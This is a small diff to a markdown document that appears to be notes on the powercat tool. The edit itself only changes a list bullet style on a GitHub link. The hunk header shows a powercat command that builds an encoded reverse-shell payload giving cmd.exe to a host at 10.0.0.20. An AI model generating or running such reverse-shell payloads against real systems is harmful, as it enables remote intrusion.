@@ -145,4 +145,4 @@ powercat -c 10.0.0.20 -p 443 -e cmd.exe -ge > reverse-shell.ps1
 
 ## URL List
 
-* [Github.com - powercat](https://github.com/besimorhino/powercat)
+- [Github.com - powercat](https://github.com/besimorhino/powercat)
